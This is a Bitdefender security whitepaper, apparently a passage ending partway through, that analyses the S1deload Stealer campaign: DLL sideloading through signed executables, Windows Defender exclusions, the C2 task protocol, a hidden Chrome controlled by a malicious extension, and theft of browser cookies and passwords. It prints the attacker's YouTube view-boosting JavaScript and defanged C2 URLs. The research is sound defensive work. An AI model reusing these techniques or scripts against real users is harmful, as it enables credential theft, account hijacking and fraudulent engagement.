@@ -1,0 +1,1776 @@
+www.bitdefender.com
+Security 
+S1deload Stealer – Exploring the 
+Economics of Social Network 
+Account Hijacking
+WHITEPAPER
+Contents
+Contents
+Foreword.......................................................................................................................................................... 3
+DLL sideloading.............................................................................................................................................. 3
+Technical analysis summary.......................................................................................................................... 4
+Initial access................................................................................................................................................................ 5
+Defeating string encryption..................................................................................................................... 8
+Dropper (WDSync.dll) analysis..................................................................................................................................10
+Loader (iMobieHelper.dll) analysis............................................................................................................................12
+C2 communication module (MVVM.dll) analysis .................................................................................................... 16
+C2 communication protocol.............................................................................................................................................17
+ID generation algorithm......................................................................................................................... 21
+Chrome controller (ToolsBag.dll) analysis...............................................................................................................22
+Hidden Chrome setup........................................................................................................................................................22
+HTTP server for user interaction simulation.................................................................................................................. 24
+Hiding and launching the attacker-controlled Chrome................................................................................................ 27
+YouTube boosting JavaScript analysis........................................................................................................................... 31
+Stealer (CNQMUTIL.dll) analysis...............................................................................................................................36
+Cookie theft..........................................................................................................................................................................39
+Saved password extraction...............................................................................................................................................41
+Establishing a Facebook account’s value....................................................................................................................... 42
+Miner (CNQMUTIL.dll) payload.................................................................................................................................. 54
+Going full circle - convincing the user to download malware................................................................................. 57
+Upview - the end product of the operation?............................................................................................................. 59
+Similarities between components............................................................................................................................63
+Network infrastructure............................................................................................................................................... 63
+Campaign distribution............................................................................................................................................... 64
+Privacy Impact.............................................................................................................................................. 65
+MITRE techniques breakdown.....................................................................................................................66
+How does Bitdefender defend against the campaign?..............................................................................66
+Protection.............................................................................................................................................................................66
+Detection...............................................................................................................................................................................67
+Conclusion..................................................................................................................................................... 70
+References.................................................................................................................................................... 71
+Indicators of Compromise............................................................................................................................72
+Hashes........................................................................................................................................................................ 72
+Domain names........................................................................................................................................................... 72
+Yara rules.................................................................................................................................................................... 73
+Appendix A - String Decryption code...........................................................................................................75
+Appendix B - Server-side perl script.............................................................................................................80
+Author:
+David ACS – Security Researcher @ Bitdefender
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+3
+Foreword
+Social networks, which have grown to occupy a significant portion of our lives, have been abused by criminals since 
+their inception. With access to multiple legitimate social media accounts, threat actors have been able to extort 
+significant financial gains, or even manipulate public opinion and  change the course of elections. On the everyday 
+level, financially motivated groups have created malvertising and spam campaigns and set up fully automated farms of 
+content-sharing websites to increase revenue or sell and rent compromised accounts to other malicious actors.
+This paper documents an active malware distribution campaign that abuses social media by taking over users’ 
+Facebook and YouTube accounts. Once in control of the compromised accounts, the malware uses them to boost view 
+counts on social media.
+Through each step of the malware infection chain, the malware author heavily relies on DLL sideloading to avoid 
+detection. We named this malware family S1deload stealer. 
+Each executable chosen by the malware author as sideloading victims share similarities:
+•	
+They load .NET DLLs from their directory
+•	
+They come from well-known software publishers
+•	
+They are digitally signed
+During our research of the malware’s infrastructure, we also identified the sales website where the malware author 
+rents out the stolen social media accounts to boost YouTube and Facebook content.
+DLL sideloading
+Dynamic-Link Libraries (DLLs) are the Microsoft Windows implementation of shared code libraries. Applications may 
+load DLLs, and call exported functions. If the application doesn’t specify the full path of the DLL at load time, the 
+Windows Loader searches the DLL in a list of predefined paths called the DLL Search Order. Abusing this behavior is 
+popular among malware, and Bitdefender outlines the possible abuse vectors. [1]
+In short, DLL sideloading is a technique used to hide malicious code in the form of a DLL loaded by a legitimate digitally 
+signed process. This method is useful when the attacker wants to trick the user into allowing processes to run as 
+administrator and may sometimes avoid application block rules. This can be done by simply dropping a malicious DLL 
+into the same folder as a digitally signed process that loads it.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+4
+Technical analysis summary
+The attack starts with a social engineering trick to persuade the user to download an archive named AlbumGirlSexy.zip.
+The archive contains three elements:
+Name
+Purpose
+AlbumGirlSexy.exe
+the only visible element in the archive, a digitally signed executable from Western Digital. 
+WDSync.dll
+a hidden .NET assembly containing malicious code
+data.dat
+a hidden self-extracting archive containing adult content
+Once the user launches AlbumGirlSexy.exe, it will load the hidden WDSync.dll, which starts the infection chain.
+WDSync.dll decrypts and writes to disk CNQ.exe along with iMobieHelper.dll in %APPDATA%\Canon. WDSync.dll also 
+launches data.dat, so that the victim does not suspect a malware infection, as they get the adult content they were 
+after in the first place.
+CNQ.exe is another digitally signed executable from iMobie Inc. used for sideloading iMobieHelper.dll. This .dll is 
+responsible for downloading the next stage of the malware from the C2 server.
+The next stage consists of CompactionTool.exe, another executable digitally signed by Western Digital, and MVVM.dll 
+dropped in %APPDATA%\BlueStack. MVVM.dll queries the C2 server for tasks to download and execute on the victim’s 
+machine. The malware can execute multiple tasks in parallel.
+We identified three types of tasks in the wild:
+Task name
+DLL name
+Task purpose
+Chrome 
+controller
+ToolsBag.dll
+Installs Chrome, controlled by the malware author through a malicious 
+extension to boost YouTube videos.
+Stealer
+CNQMUTIL.dll
+Exfiltrates passwords and cookies saved in the browser of the user. Also 
+evaluates the value  of victims’ Facebook profiles.
+Cryptojacker
+CNQMUTIL.dll
+Mines cryptocurrency without the user’s consent.
+The diagram below illustrates the infection chain, where the aim of the attacker is to only install the Chrome controller 
+task.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+5
+In the last six months, between July and December 2022, Bitdefender products detected more than 600 unique users 
+infected with this malware.
+Initial access
+The user downloads a .zip file named AlbumGirlSexy.zip. The archives are hosted on infrastructure controlled by the 
+attacker, as well as on file-sharing websites such as Dropbox. These are some sample URLs that currently serve the 
+malicious archives:
+hxxps://neuka[.]top/AlbumGirlSexy[.]zip 
+hxxp://dl[.]dropboxusercontent[.]com/s/rm1bs2iddy3oxvm/sexygirl[.]zip?dl=0
+The .zip archive contains the following files:
+AlbumGirlSexy.exe is a renamed WD Sync Service executable with a valid digital signature from Western Digital.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+6
+The .zip contains a hidden WDSync.dll file. When the user executes AlbumGirlSexy.exe, the process loads the .dll.
+data.dat is a self-extracting archive containing adult content, which is launched by the malicious WDSync.dll. 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+7
+From the user’s perspective, launching AlbumGirlSexy.exe results in the launch of the self-extracting archive containing 
+the expected adult content.
+Apart from AlbumGirlSexy.zip name, we noticed the following zip names:
+AdsOptimize.zip
+AlbumGirlSexy.zip
+AlbumPrettyGirl.zip
+Album_Lonely_In_Car_So_Yeon_Ha_Seonu_Ryuk_And_Baek_Hyeon_Myung_Kyungsoon_Photography.
+zip
+Album_Yellow_Dress_Girl_Xiao_Ling_Yan_Shao_Zhengzhong_Mengida_Xiaohui_Photography.zip
+Album_Yellow_Dress_Girl_Xiao_Ling_Yan_Yang_Shirong_Fang_Xiurong_Fengge_Photography.zip
+HDSexyGirl.zip
+Live Soccer TV - Live Football.zip
+Play WorldsCup2022 - Live TV App.zip
+SexyAlbum.zip
+SexyGirlAlbum.zip
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+8
+VSBGAlbum.zip
+Video_Niko_And_Her_Manager_What_Are_They_Doing_In_The_Office_At_The_Moment.zip
+girlleakfull.zip
+test.zip
+We can see the names of most archives suggest they contain adult content.  
+However, outliers such as AdsOptimize.zip try to trick the user by pretending to be an ad blocker.
+Live Soccer TV - Live Football.zip and Play WorldsCup2022 - Live TV App.zip pose as software that allows viewsers to 
+watch the World Cup.
+Defeating string encryption
+All of the analyzed .NET assemblies share the same string encryption scheme. In this chapter, we describe how we 
+identified string encryption and how we defeated it. 
+String decryption function description
+When analyzing the .dlls we notice that the strings in the binary are missing and are replaced with 
+function calls to \u0005\u2000.\u00002(<constant_i4>).
+The string decryption function looks as shown in the picture below:
+The string decryption function uses a dictionary that serves as a cache:
+· 
+It contains the mapping between string IDs (int) and their already decrypted strings.
+· 
+If the string has been already decrypted, return it from the dictionary via a call to TryGetValue
+· 
+If the string has not been decrypted, decrypt it, store it in the cache and return it.
+The string decryption algorithm used by the malware is complex and obfuscated, but there is no need to understand it, 
+as we can bypass it.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+9
+Algorithm for defeating string encryption
+After identifying the string decryption function, we can take the following steps to replace integer constants with their 
+string equivalent:
+1.	 identify calls to the string decryption function
+2.	 obtain the string ID passed to the function i.e. a constant i4, pushed on the stack before the call
+3.	 call the decryption function and store the result
+4.	 replace the call to the decryption function with the loading of the string
+We have documented the code that implements this algorithm in Appendix A.
+In the decryption result, we can see data that appears to be Base64 encoded, so we successfully decrypted the strings.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+10
+Dropper (WDSync.dll) analysis
+This DLL writes CNQ.exe and iMobieHelper.dll into %APPDATA%\Canon, then launches CNQ.exe.
+WDSync.dll is an obfuscated DLL that implements the minimal set of functions used by WD Sync.
+The sideloaded executable calls SyncLog.LogMessage from WDSync.dll - the function that the malware author 
+implemented to hijack the execution of the digitally signed executable.
+We consider LogMessage the entry point of the malware since it is the first function called from the malicious 
+assembly.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+11
+After decrypting CNQ.exe and iMobieHelper.dll, the malware uses the File.WriteAllBytes method to write them to 
+disk.
+The LogMessage function has the additional task of adding the malware’s paths to the Windows Defender exclusion 
+list via WMI.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+12
+Loader (iMobieHelper.dll) analysis
+iMobieHelper.dll is loaded by %APPDATA%\canon\cnq.exe when the executable starts.  
+This DLL is responsible for persistence and downloading further components from the C2 server.
+The entry point for this DLL is LogMessenger.Init i.e. it is the first function called from the signed executable. We 
+can see from the screenshot below that the persistence method is similar to the dropper’s persistence.
+The Init function also adds the same folders to the Windows Defender exclusion paths in the same way as WDSync.
+dll.
+Then, at the end of the Init function, it creates a new thread that reaches out to the C2 server to download the next 
+components.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+13
+The loader reaches out to the C2 by fetching an XML, as shown in the screenshot below.
+By capturing the traffic with Wireshark, we see that the C2 server is hosted behind Cloudflare. 
+The request includes the uuid parameter, which is hardcoded in the loader, so it presumably identifies the loader. 
+Using the uiid parameter, the threat actor can track which loaders are most successful.
+The response is an XML which contains a URL to the malware author’s C2 server in /rss/channel/item/
+enclosure.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+14
+The malware parses the XML and extracts the URL used to download the next component of the malware.
+The .zip from the extracted URL is downloaded to the %TEMP% directory with a random GUID name.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+15
+After downloading the archive, the malware extracts its contents and runs DiskCompactionTool.exe via RunCmdNoLog.
+The downloaded archive contains DiskCompactionTool.exe, a digitally signed WD Backup executable from Western 
+Digital.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+16
+All .dlls are digitally signed, except for MVVM.dll, so our analysis continues with this one.
+C2 communication module (MVVM.dll) analysis 
+This assembly is loaded by DiskCompactionTool.exe, a digitally signed executable from Western Digital, renamed by the 
+malware author.
+This .dll is responsible for ensuring persistence for the digitally signed .exe used by the malware, as well as for 
+downloading further commands from the attacker’s C2 server neukoo[.]top.
+The main entry point of this malicious assembly is Services.Compose, a function called from the 
+digitally signed executable.
+First, the malware achieves persistence via the run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
+Run\BlueStacks_bgp64. Then the malware launches a new thread similar as in the loader .dll. This thread is responsible 
+for generating an ID and receiving the next commands from the attacker.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+17
+C2 communication protocol
+The malware sends a request to hxxp://neukoo[.]top/commonupdate with two parameters:
+· 
+version that contains the machine’s ID
+· 
+uuid that is the C2 communication module’s hardcoded ID
+The request for C2 communication results in the following traffic, where the response body contains multiple lines.
+Each line in the response body is a task for the malware to download and execute. 
+The malware treats each line individually and splits the lines by |.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+18
+Each field in a line serves a different purpose, and they represent the following:
+<TimeOutInMiliseconds>|<ExtractZipAndRunUrl>|<CommaSeparatedProcessNamesToKill>| 
+<AppdataExeName>|<AppdataSubfolderName>|<bool1>|<bool2>|<bool3>|<bool4>|<TaskId>|
+Each’s fields purpose is summarized in the table below:
+Field’s name
+Field’s purpose
+TimeOutInMiliseconds
+How many milliseconds to sleep, after a request to the C2, and before 
+querying the C2 for new commands.
+UrlToExtractZipAndRunUrl
+This is a way to deploy new malware on the machine.
+It represents a URL which points to URL hosting a .zip, which will be 
+extracted and run by the malware.
+CommaSeparatedProcessNamesToKill
+List of process names to kill, by their name.
+AppdataSubfolderName
+Where the .zip contents are extracted.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+19
+Field’s name
+Field’s purpose
+AppdataExeName
+Name of the .exe to launch from AppDataSubfolderName.
+The final path looks like this: 
+%APPDATA%\<AppDataSubfolderName>\<AppDataExeName>
+TaskId
+Identifier of the task.
+<bool1-4>
+Flags that control clean-up before extracting and running the executable from 
+the downloaded archive.
+Deploying tasks on the victim’s machine
+The malware uses the UrlToExtractZipAndRunUrl to download and execute new modules on the infected PC. 
+The malware receives the following URL from the C2 server in the first line: 
+hxxp://cdn[.]neukoo[.]top/temps2/Avira.txt
+The malware performs a request to this URL, receiving as response another URL:
+Finally, the malware downloads and extracts the .zip from the URL, placing the .zip’s contents into AppdataSubfolderName.
+The contents of the downloaded .zip are as follows, in this this case Avira.exe is launched after extraction.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+20
+Registering Bot with C2 server
+When parsing the line i.e. when a new task is executed, the bot makes a request to the attacker’s C2 server with the 
+TaskId. 
+The TaskId seems to increment, for every new task received from the C2 server.
+Looking at the traffic generated by the bot registering with the C2 server, we can see that the C2 server responds with a 
+JSON document containing a status and a message. Their meaning is not clear since the bot ignores the response.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+21
+ID generation algorithm
+We summarize the algorithm with the following formula: 
+ToHex(MD5(GetCPU(), GetBIOS(), GetMotherBoard(), GetMac())) 
+The malware queries properties of CPU, BIOS, MotherBoard and MAC, then concatenates the obtained information and 
+calculates MD5 on the resulting string. Finally, transforming the MD5 output to hex.
+Querying of properties is done via WMI, and the result is concatenated, as shown in the screenshot below:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+22
+Chrome controller (ToolsBag.dll) analysis
+This assembly’s purpose is to create a hidden browser controlled by the malware author via an extension. The 
+extension sends commands to the browser to boost the view count of videos on YouTube.
+Hidden Chrome setup
+This assembly is loaded by the signed executable PhoneRescue ExtractHelper from iMobie, renamed as Avira.exe on 
+the disk. The entry point for the malicious .dll is the Init function called from the signed executable. In the entry point, 
+it creates a Form that is outside of the visible range for the user:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+23
+When the Form loads, it achieves persistence with the same run key as the previous .dll, but with AviraOE as value.
+It then determines whether Chrome is installed on the machine and, if it is, the malware copies the found Chrome folder 
+to %APPDATA%\imageclass\chrome.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+24
+If the malware does not find Chrome on the PC, it downloads and extracts legitimate Chrome binaries hosted on the 
+attacker’s infrastructure.
+HTTP server for user interaction simulation
+The Chrome controller launches a thread that starts an HttpListener on port 6881, which allows the Chrome 
+extension to send commands to ToolsBag.dll. The extension will be presented in detail in the next subsection.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+25
+The purpose of this HTTP listener is to enable the extension to simulate user interaction. The component implements 
+the following commands in the HTTP listener:
+Command
+Meaning
+click
+move the cursor within a bounding box and click somewhere inside it.
+dag
+drag the mouse from one set of coordinates to another set of coordinates
+wheel 
+simulate mouse wheel movement i.e. scrolling
+url
+download and extract a .zip, running the .exe inside it
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+26
+From these commands we only focus on “click”, as the others are similar to “click”.
+The malware generates random coordinates within the bounding box and simulates mouse movement towards the 
+generated coordinates.
+Once the mouse is at the targeted coordinates, it sends two messages to Chrome’s windows to simulate the click:
+•	
+Message number 513 - WM_LBUTTONDOWN [2]
+•	
+Message number 514 - WM_LBUTTONUP [3] 
+To move the mouse, the malware calculates the distance between the current coordinates and target coordinates, then 
+gradually moves the mouse towards the target with the help of message number 512 - WM_MOUSEMOVE. [4] 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+27
+Hiding and launching the attacker-controlled Chrome
+After launching the HTTP server that simulates user input, the malware starts two threads that are responsible for 
+periodically muting and hiding the attacker-controlled browser from the user.
+After hiding the browser, the malware searches the victim’s computer for Chrome-based browsers and copies the 
+user’s cookies and passwords to a temporary directory that will be used by the newly copied chrome.
+Finally, it runs the copied Chrome under the name worker.exe.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+28
+When launching the Chrome process, the malware gives the following argument in the command line:
+--load-extension=”%appdata%\imageclass\extension”
+The extension folder contains the following files:
+app.psgi, a server-side component written in Perl, was probably included in the archive accidentally. The Perl script 
+seems incomplete,  as it lacks the code that generates the traffic on the WebSocket. The Perl script is available in 
+Appendix B.
+manifest.json is a Chrome extension manifest that asks for god-mode permissions: accessing all URLs, allowing 
+filtering all web requests, accessing cookies, local storage and downloading data.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+29
+background.js opens a WebSocket to ytb[.]dolala[.]xyz and receives commands from that server.
+The commands the extension is able to execute are the following:
+Command
+Purpose
+js
+injects JavaScript commands in the current tab
+nav
+navigates to a new URL
+cookies
+sends all cookies to the WebSocket
+url
+sends the currently selected tab’s URL
+screenshot
+takes a screenshot of the currently visible tab
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+30
+The network traffic looks like this on the WebSocket:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+31
+The extension receives the commands to open a YouTube video to boost its views. 
+The extension is also able to send commands to ToolsBag.dll, via HTTP requests on port 6881.
+YouTube boosting JavaScript analysis
+Boosting a YouTube video means artificially increasing the number of views, likes or comments on the video. YouTube 
+considers this “Fake engagement,” which violates YouTube Policies. [5]
+In the Wireshark capture above, we see multiple JavaScript commands sent to the extension. The first JavaScript 
+command navigates to youtube.com by setting window.location.href. The second JavaScript command is much 
+longer, and it contains the video ID of the video to be boosted. The code below is a beautified version of the script:
+var videoid = ‘0DVagal1VjY’;
+function simulateE(t) {
+	
+var i = check(t);
+	
+if (0 == i) {
+	
+	
+var n = t.getBoundingClientRect();
+	
+	
+httpGet(‘http://localhost:6881/click?x=’ + n.x + ‘&y=’ + n.y + ‘&w=’ + 
+n.width + ‘&h=’ + n.height);
+	
+} else {
+	
+	
+var n = window, o = document.documentElement;
+	
+	
+httpGet(‘http://localhost:6881/wheel?direction=’ + i + ‘&x=’ + (n.inner-
+Width || o.clientWidth || l.clientWidth) + ‘&y=’ + (n.innerHeight || o.clientHeight 
+|| l.clientHeight)), setTimeout(function () {
+	
+	
+	
+simulateE(t);
+	
+	
+}, 1000);
+	
+}
+}
+function httpGet(t) {
+	
+var i = new XMLHttpRequest();
+	
+return i.open(‘GET’, t, !1), i.send(null), i.responseText;
+}
+function check(t) {
+	
+var i = t.getBoundingClientRect();
+	
+if (i.top < 0)
+	
+	
+return 1;
+	
+var n = window, o = document, d = o.documentElement, l = o.getElementsBy-
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+32
+TagName(‘body’)[0], r = (n.innerWidth || d.clientWidth || l.clientWidth, n.innerHe-
+ight || d.clientHeight || l.clientHeight);
+	
+return i.bottom >= r ? -1 : 0;
+}
+function timdiet(t) {
+	
+try {
+	
+	
+var i, n = Object.prototype.toString.call(t);
+	
+	
+if (‘[object Object]’ == n || ‘[object Array]’ == n)
+	
+	
+	
+for (var o in t)
+	
+	
+	
+	
+if (‘videoId’ == o || ‘addedVideoId’ == o || ‘removed-
+VideoId’ == o)
+	
+	
+	
+	
+	
+t[o] = videoid;
+	
+	
+	
+	
+else if (‘videoIds’ == o) {
+	
+	
+	
+	
+	
+if (‘[object String]’ == (i = Object.prototype.to-
+String.call(t[o])))
+	
+	
+	
+	
+	
+	
+t[o] = videoid;
+	
+	
+	
+	
+	
+else if (‘[object Array]’ == i)
+	
+	
+	
+	
+	
+	
+for (var d in t[o])
+	
+	
+	
+	
+	
+	
+	
+t[o][d] = videoid;
+	
+	
+	
+	
+} else
+	
+	
+	
+	
+	
+‘url’ == o ? ‘[object String]’ == (i = Object.proto-
+type.toString.call(t[o])) && t[o].indexOf(‘watch?v=’) > -1 && (t[o] = ‘/watch?v=’ + 
+videoid) : timdiet(t[o]);
+	
+} catch (l) {
+	
+}
+}
+timdiet(window.ytInitialData);
+var nodes = document.getElementsByTagName(‘a’);
+for (let e = 0; e < nodes.length; e++)
+	
+nodes[e].href.indexOf(‘watch?v=’) > -1 && (nodes[e].href = ‘https://www.you-
+tube.com/watch?v=’ + videoid);
+function childerenall(t) {
+	
+timdiet(t.data);
+	
+let i = t.children;
+	
+for (let n = 0; n < i.length; n++)
+	
+	
+childerenall(i[n]);
+}
+var nodes5 = document.getElementsByTagName(‘ytd-video-renderer’);
+for (let e = 0; e < nodes5.length; e++)
+	
+childerenall(nodes5[e]);
+var nodes2 = document.getElementsByTagName(‘ytd-compact-video-renderer’);
+for (let e = 0; e < nodes2.length; e++)
+	
+childerenall(nodes2[e]);
+var nodes4 = document.getElementsByTagName(‘ytd-rich-grid-media’);
+for (let e = 0; e < nodes4.length; e++)
+	
+childerenall(nodes4[e]);
+var nodes6 = document.getElementsByTagName(‘ytd-playlist-panel-video-renderer’);
+for (let e = 0; e < nodes6.length; e++)
+	
+childerenall(nodes6[e]);
+var nodes3 = document.getElementsByTagName(‘a’), isok = !1;
+for (let e = 0; e < nodes3.length; e++)
+	
+if (‘’ != nodes3[e].href && nodes3[e].href.indexOf(videoid) > -1) {
+	
+	
+var t, i = nodes3[e].getAttribute(‘id’), n = nodes3[e].getBoundingClien-
+tRect();
+	
+	
+if ((0 != n.x || 0 != n.y) && (‘video-title-link’ == i || ‘video-title’ 
+== i || ‘thumbnail’ == i)) {
+	
+	
+	
+var o = nodes3[e].getElementsByTagName(‘div’), d = !1, l = 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+33
+nodes3[e].closest(‘ytd-rich-item-renderer’);
+	
+	
+	
+if (null != l && void 0 != l) {
+	
+	
+	
+	
+var r = l.getElementsByTagName(‘ytd-thumbnail-overlay-bot-
+tom-panel-renderer’);
+	
+	
+	
+	
+if (null != r && void 0 != r && r.length > 0 && (d = !0), 
+!d) {
+	
+	
+	
+	
+	
+var o = l.getElementsByTagName(‘div’);
+	
+	
+	
+	
+	
+for (let a = 0; a < o.length; a++)
+	
+	
+	
+	
+	
+	
+if (‘progress’ == o[a].getAttribute(‘id’)) {
+	
+	
+	
+	
+	
+	
+	
+d = !0;
+	
+	
+	
+	
+	
+	
+	
+break;
+	
+	
+	
+	
+	
+	
+}
+	
+	
+	
+	
+}
+	
+	
+	
+}
+	
+	
+	
+if (d)
+	
+	
+	
+	
+continue;
+	
+	
+	
+var s = nodes3[e].closest(‘ytd-playlist-panel-video-renderer’);
+	
+	
+	
+if (null != s && void 0 != s && (d = !0), d)
+	
+	
+	
+	
+continue;
+	
+	
+	
+var c = nodes3[e].closest(‘ytd-compact-video-renderer’);
+	
+	
+	
+if (null != c && void 0 != c) {
+	
+	
+	
+	
+var o = c.getElementsByTagName(‘div’);
+	
+	
+	
+	
+for (let h = 0; h < o.length; h++)
+	
+	
+	
+	
+	
+if (‘progress’ == o[h].getAttribute(‘id’)) {
+	
+	
+	
+	
+	
+	
+d = !0;
+	
+	
+	
+	
+	
+	
+break;
+	
+	
+	
+	
+	
+}
+	
+	
+	
+}
+	
+	
+	
+if (d)
+	
+	
+	
+	
+continue;
+	
+	
+	
+simulateE(nodes3[e]), isok = !0;
+	
+	
+	
+break;
+	
+	
+}
+	
+}
+isok || (window.location.href = ‘https://www.youtube.com/’);
+The script replaces all valid video IDs in the YouTube feed with the video ID it wants to boost. Note that the script does 
+NOT replace the title of the video, so in the screenshot below the old title “Christmas song 2022” remains.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+34
+Next, it searches for a link (<a>) that contains the video ID and is of type video-title-link, video-title or 
+thumbnail and sends a request to the ToolsBag.dll component with the coordinates of the link to click on it:
+http://localhost:6881/click?x=37&y=136&w=319.984375&h=179.984375
+The method the malware author uses to navigate to the YouTube video is complex and tries to mimic real user 
+behavior. We suspect the malware author didn’t simply instruct the browser to navigate directly to the boosted video’s 
+URL because YouTube detects such simple attempts to boost a video’s view count and flags them. 
+The third JavaScript command now runs on the page, where the boosted video plays.
+function httpGet(b) {
+	
+var a = new XMLHttpRequest();
+	
+return a.open(‘GET’, b, !1), a.send(null), a.responseText;
+}
+function simulateE(b) {
+	
+var a = b.getBoundingClientRect();
+	
+httpGet(‘http://localhost:6881/click?x=’ + a.x + ‘&y=’ + a.y + ‘&w=’ + a.width 
++ ‘&h=’ + a.height);
+}
+setInterval(function () {
+	
+var b = document.getElementsByTagName(‘path’);
+	
+for (let a = 0; a < b.length; a++)
+	
+	
+if (‘M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z’ == 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+35
+b[a].getAttribute(‘d’)) {
+	
+	
+	
+var c = b[a].getBoundingClientRect();
+	
+	
+	
+(0 != c.x || 0 != c.y) && simulateE(b[a]);
+	
+	
+}
+}, 2000), setInterval(function () {
+	
+var b = document.getElementsByTagName(‘path’);
+	
+for (let a = 0; a < b.length; a++)
+	
+	
+if (‘M 18,11 V 7 l -5,5 5,5 v -4 c 3.3,0 6,2.7 6,6 0,3.3 -2.7,6 -6,6 
+-3.3,0 -6,-2.7 -6,-6 h -2 c 0,4.4 3.6,8 8,8 4.4,0 8,-3.6 8,-8 0,-4.4 -3.6,-8 -8,-8 
+z’ == b[a].getAttribute(‘d’)) {
+	
+	
+	
+var c = b[a].getBoundingClientRect();
+	
+	
+	
+(0 != c.x || 0 != c.y) && simulateE(b[a]);
+	
+	
+}
+}, 2000), setInterval(function () {
+	
+var b = document.getElementsByTagName(‘div’);
+	
+for (let a = 0; a < b.length; a++)
+	
+	
+if (null != b[a].getAttribute(‘id’) && b[a].getAttribute(‘id’).index-
+Of(‘skip-button’) > -1) {
+	
+	
+	
+var d = b[a].getElementsByTagName(‘button’);
+	
+	
+	
+for (let c = 0; c < d.length; c++) {
+	
+	
+	
+	
+var e = d[c].getBoundingClientRect();
+	
+	
+	
+	
+(0 != e.x || 0 != e.y) && simulateE(d[c]);
+	
+	
+	
+}
+	
+	
+}
+}, 2000);
+It uses setInterval to call three functions every two seconds.
+The first function is responsible for starting the video if it stops. It searches for the Play button on YouTube and, if the 
+script finds the button, it instructs ToolsBag.dll to click it.
+The second function re-starts the video if it ends. The function searches for the Replay button on YouTube and if it is 
+found, sends a request to ToolsBag.dll to click it.
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+36
+The third function automatically clicks on the Skip Ad button, in a similar way to the previous functions: by searching 
+for the button, obtaining its bounding box and instructing ToolsBag.dll to click it.
+Stealer (CNQMUTIL.dll) analysis
+This .NET assembly is a stealer that exfiltrates the saved credentials and cookies from the victim’s browser. If the user 
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+37
+has a valid Facebook session, the malware leverages Facebook’s Graph API to determine how valuable the account is 
+for the malware author:
+•	
+does the victim pay for ads?
+•	
+are any business manager accounts accessible?
+•	
+is the account administering any page or group?
+This .dll is loaded into Bravia.exe, a digitally signed .exe from Canon. The entry point is the get method from the 
+FolderPath property, called from the digitally signed executable.
+Next, it performs some cleanup: deletes all files in the Temps folder and searches for Local State files in %APPDATA% 
+and %LOCALAPPDATA%. The purpose of the search is to find Chrome-based browser’s User Data folder that, as its 
+name suggests, contains user data such as saved credentials and cookies.
+For each found Local State i.e. Chrome installation, the malware:
+•	
+searches for Chrome profiles by searching for Login Data in the folder of Local State
+•	
+loads Local State as JSON and Decrypts the encrypted_key via DPAPI
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+38
+The malware author wrote a utility function to decrypt cookies, logins and encrypted_key from Local State. If the 
+buffer to be decrypted starts with DPAPI (68, 80, 65, 80, 73) it calls ProtecedData.UnProtect [6] on the data to be 
+decrypted.
+If the buffer starts with v10 (118, 49, 48) it performs AES decryption:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+39
+Cookie theft
+For each profile found by searching for Login Data, the malware extracts the name of the profile, by getting its directory 
+name. Next, the stealer searches for the Cookies database and copies it to a temporary folder it created at the 
+beginning.
+The malware starts querying cookies from the cookie database:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+40
+It decrypts the cookie’s value if it has been encrypted:
+Finally, it stores the extracted cookies in a list:
+Bitdefender Whitepaper
+S1deload Stealer – Exploring the Economics of Social Network Account Hijacking
+41
